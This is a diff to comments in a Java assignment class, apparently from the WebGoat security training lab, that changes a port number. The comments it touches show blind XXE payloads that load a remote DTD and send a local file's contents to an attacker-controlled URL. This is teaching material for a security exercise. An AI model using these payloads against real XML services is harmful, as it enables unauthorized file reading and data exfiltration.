@@ -89,7 +89,7 @@ public class BlindSendFileAssignment extends AssignmentEndpoint {
 /**
 <?xml version="1.0"?>
 <!DOCTYPE comment [
-<!ENTITY % remote SYSTEM "http://localhost:8081/files/admin2/attack.dtd">
+<!ENTITY % remote SYSTEM "http://localhost:9090/files/admin2/attack.dtd">
 %remote;
 ]>
 <comment>  <text>test&send;</text></comment>
@@ -102,14 +102,14 @@ public class BlindSendFileAssignment extends AssignmentEndpoint {
      * <pre>
      *     <?xml version="1.0" encoding="UTF-8"?>
      *     <!ENTITY % file SYSTEM "file:///c:/windows-version.txt">
-     *     <!ENTITY % all "<!ENTITY send SYSTEM 'http://localhost:8081/ping?text=%file;'>">
+     *     <!ENTITY % all "<!ENTITY send SYSTEM 'http://localhost:9090/ping?text=%file;'>">
      *      %all;
      * </pre>
      *
      * This will be reduced to:
      *
      * <pre>
-     *     <!ENTITY send SYSTEM 'http://localhost:8081/ping?text=[contents_file]'>
+     *     <!ENTITY send SYSTEM 'http://localhost:9090/ping?text=[contents_file]'>
      * </pre>
      *
      * Wire it all up in the xml send to the server:
@@ -117,7 +117,7 @@ public class BlindSendFileAssignment extends AssignmentEndpoint {
      * <pre>
      *  <?xml version="1.0"?>
      *  <!DOCTYPE root [
-     *  <!ENTITY % remote SYSTEM "http://localhost:8081/WebWolf/files/test.dtd">
+     *  <!ENTITY % remote SYSTEM "http://localhost:9090/WebWolf/files/test.dtd">
      *  %remote;
      *   ]>
      *  <user>
